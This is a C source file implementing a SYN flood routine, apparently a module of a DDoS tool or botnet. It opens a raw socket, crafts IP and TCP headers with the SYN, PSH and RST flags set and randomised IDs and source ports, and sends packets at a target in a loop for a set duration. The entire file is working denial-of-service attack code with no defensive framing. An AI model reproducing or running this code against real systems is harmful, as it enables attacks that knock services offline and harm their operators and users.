#define _GNU_SOURCE

#include "headers/syn_attack.h"
#include "headers/checksum.h"
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>
#include <stddef.h>
#include <stdint.h>

void* syn_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    int syn_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (syn_sock < 0) {
        return NULL;
    }

    int one = 1;
    const int *val = &one;
    setsockopt(syn_sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one));

    const size_t ip_size = sizeof(struct iphdr);
    const size_t tcp_size = sizeof(struct tcphdr);
    const size_t min_packet_size = ip_size + tcp_size;
    
    size_t packet_size = params->psize > 0 ? (size_t)params->psize : 40;
    if (packet_size < min_packet_size) packet_size = min_packet_size;

    unsigned char *packet = calloc(1, packet_size);
    if (!packet) {
        close(syn_sock);
        return NULL;
    }

    struct iphdr* iph = (struct iphdr*) packet;
    struct tcphdr* tcph = (struct tcphdr*) (packet + ip_size);

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = params->target_addr.sin_port;
    dest.sin_addr = params->target_addr.sin_addr;

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons((uint16_t)(ip_size + tcp_size));
    iph->id = htons((uint16_t)(rand() & 0xFFFF));
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = INADDR_ANY;
    iph->daddr = params->target_addr.sin_addr.s_addr;

    // linux/ip.h alternative (24 may, 2025)
    uint16_t src_port = params->srcport > 0 ? (uint16_t)params->srcport : (uint16_t)(rand() & 0xFFFF);
    tcph->source = htons(src_port);
    tcph->dest = params->target_addr.sin_port;
    tcph->seq = htonl((uint32_t)rand());
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->ack = 0;
    tcph->psh = 1;
    tcph->rst = 1;
    tcph->fin = 0;
    tcph->urg = 0;
    tcph->window = htons(512);
    tcph->check = 0;
    tcph->urg_ptr = 0;

    time_t end_time = time(NULL) + params->duration;
    while (params->active && time(NULL) < end_time) {
        iph->id = htons((uint16_t)(rand() & 0xFFFF));
        iph->check = 0;
        tcph->check = 0;
        
        iph->check = generic_checksum((unsigned short*)iph, ip_size);
        tcph->check = tcp_udp_checksum(tcph, tcp_size, iph->saddr, iph->daddr, IPPROTO_TCP);
        
        ssize_t sent = sendto(syn_sock, packet, packet_size, 0, 
                            (struct sockaddr*)&dest, sizeof(dest));
        if (sent < 0) break;
    }

    free(packet);
    close(syn_sock);
    return NULL;
}
